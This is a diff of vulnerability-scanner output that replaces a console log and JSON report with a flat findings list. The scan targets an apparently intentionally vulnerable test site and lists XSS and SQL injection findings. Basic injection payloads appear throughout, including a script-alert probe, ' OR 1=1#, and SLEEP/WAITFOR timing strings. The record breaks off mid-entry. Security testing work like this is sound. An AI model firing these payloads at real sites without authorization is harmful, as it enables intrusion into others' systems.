@@ -1,493 +1,392 @@
-
-[36m╔══════════════════════════════════════════════════════════════════╗
-║                          VulnScanner v2.0                       ║
-║                Advanced Penetration Testing Toolkit             ║
-║                   For authorized testing only                    ║
-╚══════════════════════════════════════════════════════════════════╝[0m
-
-[32m[✓] Target: http://testphp.vulnweb.com/
-[✓] Threads: 5
-[✓] Max Pages: 10
-[✓] Timeout: 5s[0m
-
-
-[36m[*] Crawling http://testphp.vulnweb.com/ for forms and links...[0m
-Crawling: 0pages [00:00, ?pages/s]Crawling: 1pages [00:00,  3.04pages/s][34m[i] Crawled: http://testphp.vulnweb.com/ - Found 1 forms[0m
-Crawling: 2pages [00:00,  3.09pages/s][34m[i] Crawled: http://testphp.vulnweb.com/index.php - Found 1 forms[0m
-Crawling: 3pages [00:01,  2.56pages/s][34m[i] Crawled: http://testphp.vulnweb.com/categories.php - Found 1 forms[0m
-Crawling: 4pages [00:01,  2.75pages/s][34m[i] Crawled: http://testphp.vulnweb.com/artists.php - Found 1 forms[0m
-Crawling: 5pages [00:01,  2.54pages/s][34m[i] Crawled: http://testphp.vulnweb.com/disclaimer.php - Found 1 forms[0m
-Crawling: 6pages [00:02,  2.12pages/s][34m[i] Crawled: http://testphp.vulnweb.com/cart.php - Found 1 forms[0m
-Crawling: 7pages [00:02,  2.11pages/s][34m[i] Crawled: http://testphp.vulnweb.com/guestbook.php - Found 2 forms[0m
-Crawling: 8pages [00:03,  2.09pages/s][34m[i] Crawled: http://testphp.vulnweb.com/AJAX/index.php - Found 0 forms[0m
-Crawling: 9pages [00:03,  2.37pages/s][34m[i] Crawled: http://testphp.vulnweb.com/login.php - Found 2 forms[0m
-Crawling: 10pages [00:04,  2.21pages/s][34m[i] Crawled: http://testphp.vulnweb.com/userinfo.php - Found 2 forms[0m
-[32m[✓] Crawling complete: 12 forms found across 10 pages[0m
-Crawling: 10pages [00:04,  2.22pages/s]
-[32m[✓] Found 12 forms across 9 pages[0m
-
-[36m[*] Testing for XSS vulnerabilities...[0m
-XSS Testing:   0% 0/12 [00:00<?, ?forms/s][31m[!] XSS Found: http://testphp.vulnweb.com/categories.php - Field: searchFor[0m
-[31m[!] XSS Found: http://testphp.vulnweb.com/disclaimer.php - Field: searchFor[0m
-[31m[!] XSS Found: http://testphp.vulnweb.com/ - Field: searchFor[0m
-[31m[!] XSS Found: http://testphp.vulnweb.com/artists.php - Field: searchFor[0m
-[31m[!] XSS Found: http://testphp.vulnweb.com/index.php - Field: searchFor[0m
-XSS Testing:   8% 1/12 [00:02<00:25,  2.31s/forms][31m[!] XSS Found: http://testphp.vulnweb.com/cart.php - Field: searchFor[0m
-XSS Testing:  17% 2/12 [00:03<00:17,  1.77s/forms]XSS Testing:  33% 4/12 [00:03<00:05,  1.38forms/s]XSS Testing:  42% 5/12 [00:03<00:02,  2.85forms/s][31m[!] XSS Found: http://testphp.vulnweb.com/guestbook.php - Field: searchFor[0m
-[31m[!] XSS Found: http://testphp.vulnweb.com/guestbook.php - Field: name[0m
-XSS Testing:  50% 6/12 [00:04<00:02,  2.76forms/s][31m[!] XSS Found: http://testphp.vulnweb.com/login.php - Field: searchFor[0m
-XSS Testing:  58% 7/12 [00:07<00:05,  1.02s/forms]XSS Testing:  67% 8/12 [00:07<00:03,  1.24forms/s][31m[!] XSS Found: http://testphp.vulnweb.com/userinfo.php - Field: searchFor[0m
-XSS Testing:  75% 9/12 [00:07<00:02,  1.47forms/s]XSS Testing:  83% 10/12 [00:10<00:02,  1.21s/forms]XSS Testing: 100% 12/12 [00:11<00:00,  1.30forms/s]XSS Testing: 100% 12/12 [00:11<00:00,  1.09forms/s]
-[36m[*] Testing for SQL Injection vulnerabilities...[0m
-SQLi Testing:   0% 0/12 [00:00<?, ?forms/s][31m[!] SQLi Found: http://testphp.vulnweb.com/index.php - Field: searchFor - Type: Error-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/ - Field: searchFor - Type: Error-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/categories.php - Field: searchFor - Type: Error-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/disclaimer.php - Field: searchFor - Type: Error-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/artists.php - Field: searchFor - Type: Error-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/ - Field: searchFor - Type: Time-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/disclaimer.php - Field: searchFor - Type: Time-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/index.php - Field: searchFor - Type: Time-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/categories.php - Field: searchFor - Type: Time-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/artists.php - Field: searchFor - Type: Time-based SQLi[0m
-[31m[!] SQLi Found (Timeout): http://testphp.vulnweb.com/ - Field: searchFor[0m
-[33m[!] Timeout testing SQLi on http://testphp.vulnweb.com/search.php?test=query[0m
-[31m[!] SQLi Found (Timeout): http://testphp.vulnweb.com/disclaimer.php - Field: searchFor[0m
-[33m[!] Timeout testing SQLi on http://testphp.vulnweb.com/search.php?test=query[0m
-[31m[!] SQLi Found (Timeout): http://testphp.vulnweb.com/index.php - Field: searchFor[0m
-[33m[!] Timeout testing SQLi on http://testphp.vulnweb.com/search.php?test=query[0m
-[31m[!] SQLi Found (Timeout): http://testphp.vulnweb.com/categories.php - Field: searchFor[0m
-[33m[!] Timeout testing SQLi on http://testphp.vulnweb.com/search.php?test=query[0m
-SQLi Testing:   8% 1/12 [00:21<03:52, 21.16s/forms]SQLi Testing:  25% 3/12 [00:21<00:49,  5.55s/forms][31m[!] SQLi Found: http://testphp.vulnweb.com/guestbook.php - Field: searchFor - Type: Error-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/cart.php - Field: searchFor - Type: Error-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/guestbook.php - Field: name - Type: Error-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/login.php - Field: uname - Type: Error-based SQLi[0m
-SQLi Testing:  42% 5/12 [00:21<00:19,  2.86s/forms][31m[!] SQLi Found: http://testphp.vulnweb.com/login.php - Field: searchFor - Type: Error-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/login.php - Field: uname - Type: Time-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/guestbook.php - Field: searchFor - Type: Time-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/cart.php - Field: searchFor - Type: Time-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/login.php - Field: searchFor - Type: Time-based SQLi[0m
-SQLi Testing:  50% 6/12 [00:27<00:21,  3.56s/forms][31m[!] SQLi Found: http://testphp.vulnweb.com/userinfo.php - Field: uname - Type: Error-based SQLi[0m
-[31m[!] SQLi Found: http://testphp.vulnweb.com/userinfo.php - Field: uname - Type: Time-based SQLi[0m
-SQLi Testing:  58% 7/12 [00:33<00:20,  4.14s/forms][31m[!] SQLi Found: http://testphp.vulnweb.com/userinfo.php - Field: searchFor - Type: Error-based SQLi[0m
-SQLi Testing:  67% 8/12 [00:35<00:14,  3.63s/forms][31m[!] SQLi Found: http://testphp.vulnweb.com/userinfo.php - Field: searchFor - Type: Time-based SQLi[0m
-[31m[!] SQLi Found (Timeout): http://testphp.vulnweb.com/guestbook.php - Field: searchFor[0m
-[33m[!] Timeout testing SQLi on http://testphp.vulnweb.com/search.php?test=query[0m
-[31m[!] SQLi Found (Timeout): http://testphp.vulnweb.com/cart.php - Field: searchFor[0m
-[33m[!] Timeout testing SQLi on http://testphp.vulnweb.com/search.php?test=query[0m
-[31m[!] SQLi Found (Timeout): http://testphp.vulnweb.com/login.php - Field: searchFor[0m
-[33m[!] Timeout testing SQLi on http://testphp.vulnweb.com/search.php?test=query[0m
-SQLi Testing:  75% 9/12 [00:42<00:14,  4.69s/forms]SQLi Testing:  83% 10/12 [00:42<00:06,  3.40s/forms]SQLi Testing:  92% 11/12 [00:43<00:02,  2.51s/forms][31m[!] SQLi Found (Timeout): http://testphp.vulnweb.com/userinfo.php - Field: searchFor[0m
-[33m[!] Timeout testing SQLi on http://testphp.vulnweb.com/search.php?test=query[0m
-SQLi Testing: 100% 12/12 [00:55<00:00,  5.50s/forms]SQLi Testing: 100% 12/12 [00:55<00:00,  4.66s/forms]
-
-[36m[*] Scan completed in 71.51 seconds[0m
-[32m[✓] Found 41 total findings[0m
-
-{
-  "scan_info": {
-    "target": "http://testphp.vulnweb.com/",
-    "timestamp": "2025-06-08 12:25:38",
-    "duration_seconds": 71.51059103012085,
-    "total_findings": 41
+[
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com",
+    "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "<script>alert('xss')</script>",
+    "method": "POST",
+    "severity": "high"
   },
-  "findings": [
-    {
-      "type": "XSS",
-      "url": "http://testphp.vulnweb.com/",
-      "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "<script>alert('xss')</script>",
-      "method": "POST",
-      "severity": "high"
-    },
-    {
-      "type": "XSS",
-      "url": "http://testphp.vulnweb.com/index.php",
-      "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "<script>alert('xss')</script>",
-      "method": "POST",
-      "severity": "high"
-    },
-    {
-      "type": "XSS",
-      "url": "http://testphp.vulnweb.com/categories.php",
-      "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "<script>alert('xss')</script>",
-      "method": "POST",
-      "severity": "high"
-    },
-    {
-      "type": "XSS",
-      "url": "http://testphp.vulnweb.com/artists.php",
-      "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "<script>alert('xss')</script>",
-      "method": "POST",
-      "severity": "high"
-    },
-    {
-      "type": "XSS",
-      "url": "http://testphp.vulnweb.com/disclaimer.php",
-      "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "<script>alert('xss')</script>",
-      "method": "POST",
-      "severity": "high"
-    },
-    {
-      "type": "XSS",
-      "url": "http://testphp.vulnweb.com/cart.php",
-      "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "<script>alert('xss')</script>",
-      "method": "POST",
-      "severity": "high"
-    },
-    {
-      "type": "XSS",
-      "url": "http://testphp.vulnweb.com/guestbook.php",
-      "details": "Possible XSS in field 'name' at http://testphp.vulnweb.com/guestbook.php",
-      "payload": "<script>alert('xss')</script>",
-      "method": "POST",
-      "severity": "high"
-    },
-    {
-      "type": "XSS",
-      "url": "http://testphp.vulnweb.com/guestbook.php",
-      "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "<script>alert('xss')</script>",
-      "method": "POST",
-      "severity": "high"
-    },
-    {
-      "type": "XSS",
-      "url": "http://testphp.vulnweb.com/login.php",
-      "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "<script>alert('xss')</script>",
-      "method": "POST",
-      "severity": "high"
-    },
-    {
-      "type": "XSS",
-      "url": "http://testphp.vulnweb.com/userinfo.php",
-      "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "<script>alert('xss')</script>",
-      "method": "POST",
-      "severity": "high"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/",
-      "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "' OR 1=1#",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi",
-      "url": "http://testphp.vulnweb.com/",
-      "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'; WAITFOR DELAY '00:00:05'--",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi (Timeout)",
-      "url": "http://testphp.vulnweb.com/",
-      "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
-      "payload": "' OR SLEEP(5)--",
-      "method": "POST",
-      "error_signature": "Request timeout",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/index.php",
-      "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "' OR 1=1#",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi",
-      "url": "http://testphp.vulnweb.com/index.php",
-      "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'; WAITFOR DELAY '00:00:05'--",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi (Timeout)",
-      "url": "http://testphp.vulnweb.com/index.php",
-      "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
-      "payload": "' OR SLEEP(5)--",
-      "method": "POST",
-      "error_signature": "Request timeout",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/categories.php",
-      "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "' OR 1=1#",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi",
-      "url": "http://testphp.vulnweb.com/categories.php",
-      "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'; WAITFOR DELAY '00:00:05'--",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi (Timeout)",
-      "url": "http://testphp.vulnweb.com/categories.php",
-      "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
-      "payload": "' OR SLEEP(5)--",
-      "method": "POST",
-      "error_signature": "Request timeout",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/artists.php",
-      "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "' OR 1=1#",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi",
-      "url": "http://testphp.vulnweb.com/artists.php",
-      "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'; WAITFOR DELAY '00:00:05'--",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/disclaimer.php",
-      "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "' OR 1=1#",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi",
-      "url": "http://testphp.vulnweb.com/disclaimer.php",
-      "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'; WAITFOR DELAY '00:00:05'--",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi (Timeout)",
-      "url": "http://testphp.vulnweb.com/disclaimer.php",
-      "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
-      "payload": "' OR SLEEP(5)--",
-      "method": "POST",
-      "error_signature": "Request timeout",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/cart.php",
-      "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'",
-      "method": "POST",
-      "error_signature": "mysql_connect",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi",
-      "url": "http://testphp.vulnweb.com/cart.php",
-      "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'; WAITFOR DELAY '00:00:05'--",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi (Timeout)",
-      "url": "http://testphp.vulnweb.com/cart.php",
-      "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
-      "payload": "' OR SLEEP(5)--",
-      "method": "POST",
-      "error_signature": "Request timeout",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/guestbook.php",
-      "details": "Possible Error-based SQLi in field 'name' at http://testphp.vulnweb.com/guestbook.php",
-      "payload": "'",
-      "method": "POST",
-      "error_signature": "mysql_connect",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/guestbook.php",
-      "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'",
-      "method": "POST",
-      "error_signature": "mysql_connect",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi",
-      "url": "http://testphp.vulnweb.com/guestbook.php",
-      "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'; WAITFOR DELAY '00:00:05'--",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi (Timeout)",
-      "url": "http://testphp.vulnweb.com/guestbook.php",
-      "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
-      "payload": "' OR SLEEP(5)--",
-      "method": "POST",
-      "error_signature": "Request timeout",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/login.php",
-      "details": "Possible Error-based SQLi in field 'uname' at http://testphp.vulnweb.com/userinfo.php",
-      "payload": "'",
-      "method": "POST",
-      "error_signature": "mysql_connect",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi",
-      "url": "http://testphp.vulnweb.com/login.php",
-      "details": "Possible Time-based SQLi in field 'uname' at http://testphp.vulnweb.com/userinfo.php",
-      "payload": "'; WAITFOR DELAY '00:00:05'--",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/login.php",
-      "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'",
-      "method": "POST",
-      "error_signature": "mysql_connect",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi",
-      "url": "http://testphp.vulnweb.com/login.php",
-      "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'; WAITFOR DELAY '00:00:05'--",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi (Timeout)",
-      "url": "http://testphp.vulnweb.com/login.php",
-      "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
-      "payload": "' OR SLEEP(5)--",
-      "method": "POST",
-      "error_signature": "Request timeout",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/userinfo.php",
-      "details": "Possible Error-based SQLi in field 'uname' at http://testphp.vulnweb.com/userinfo.php",
-      "payload": "'",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi",
-      "url": "http://testphp.vulnweb.com/userinfo.php",
-      "details": "Possible Time-based SQLi in field 'uname' at http://testphp.vulnweb.com/userinfo.php",
-      "payload": "'; WAITFOR DELAY '00:00:05'--",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Error-based SQLi",
-      "url": "http://testphp.vulnweb.com/userinfo.php",
-      "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "' OR 1=1#",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi",
-      "url": "http://testphp.vulnweb.com/userinfo.php",
-      "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
-      "payload": "'; WAITFOR DELAY '00:00:05'--",
-      "method": "POST",
-      "error_signature": "You have an error in your SQL syntax",
-      "severity": "critical"
-    },
-    {
-      "type": "SQL Injection",
-      "subtype": "Time-based SQLi (Timeout)",
-      "url": "http://testphp.vulnweb.com/userinfo.php",
-      "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
-      "payload": "' OR SLEEP(5)--",
-      "method": "POST",
-      "error_signature": "Request timeout",
-      "severity": "critical"
-    }
-  ],
-  "summary": {
-    "critical": 31,
-    "high": 10,
-    "medium": 0,
-    "low": 0,
-    "info": 0
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com/index.php",
+    "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "<script>alert('xss')</script>",
+    "method": "POST",
+    "severity": "high"
+  },
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com/categories.php",
+    "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "<script>alert('xss')</script>",
+    "method": "POST",
+    "severity": "high"
+  },
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com/artists.php",
+    "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "<script>alert('xss')</script>",
+    "method": "POST",
+    "severity": "high"
+  },
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com/disclaimer.php",
+    "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "<script>alert('xss')</script>",
+    "method": "POST",
+    "severity": "high"
+  },
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com/cart.php",
+    "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "<script>alert('xss')</script>",
+    "method": "POST",
+    "severity": "high"
+  },
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com/guestbook.php",
+    "details": "Possible XSS in field 'name' at http://testphp.vulnweb.com/guestbook.php",
+    "payload": "<script>alert('xss')</script>",
+    "method": "POST",
+    "severity": "high"
+  },
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com/guestbook.php",
+    "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "<script>alert('xss')</script>",
+    "method": "POST",
+    "severity": "high"
+  },
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com/login.php",
+    "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "<script>alert('xss')</script>",
+    "method": "POST",
+    "severity": "high"
+  },
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com/userinfo.php",
+    "details": "Possible XSS in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "<script>alert('xss')</script>",
+    "method": "POST",
+    "severity": "high"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Error-based SQLi",
+    "url": "http://testphp.vulnweb.com",
+    "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "' OR 1=1#",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi",
+    "url": "http://testphp.vulnweb.com",
+    "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "'; WAITFOR DELAY '00:00:05'--",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi (Timeout)",
+    "url": "http://testphp.vulnweb.com",
+    "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
+    "payload": "' OR SLEEP(5)--",
+    "method": "POST",
+    "error_signature": "Request timeout",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Error-based SQLi",
+    "url": "http://testphp.vulnweb.com/index.php",
+    "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "' OR 1=1#",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi",
+    "url": "http://testphp.vulnweb.com/index.php",
+    "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "'; WAITFOR DELAY '00:00:05'--",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi (Timeout)",
+    "url": "http://testphp.vulnweb.com/index.php",
+    "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
+    "payload": "' OR SLEEP(5)--",
+    "method": "POST",
+    "error_signature": "Request timeout",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Error-based SQLi",
+    "url": "http://testphp.vulnweb.com/categories.php",
+    "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "' OR 1=1#",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi",
+    "url": "http://testphp.vulnweb.com/categories.php",
+    "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "'; WAITFOR DELAY '00:00:05'--",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi (Timeout)",
+    "url": "http://testphp.vulnweb.com/categories.php",
+    "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
+    "payload": "' OR SLEEP(5)--",
+    "method": "POST",
+    "error_signature": "Request timeout",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Error-based SQLi",
+    "url": "http://testphp.vulnweb.com/artists.php",
+    "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "' OR 1=1#",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi",
+    "url": "http://testphp.vulnweb.com/artists.php",
+    "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "'; WAITFOR DELAY '00:00:05'--",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi (Timeout)",
+    "url": "http://testphp.vulnweb.com/artists.php",
+    "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
+    "payload": "' OR SLEEP(5)--",
+    "method": "POST",
+    "error_signature": "Request timeout",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Error-based SQLi",
+    "url": "http://testphp.vulnweb.com/disclaimer.php",
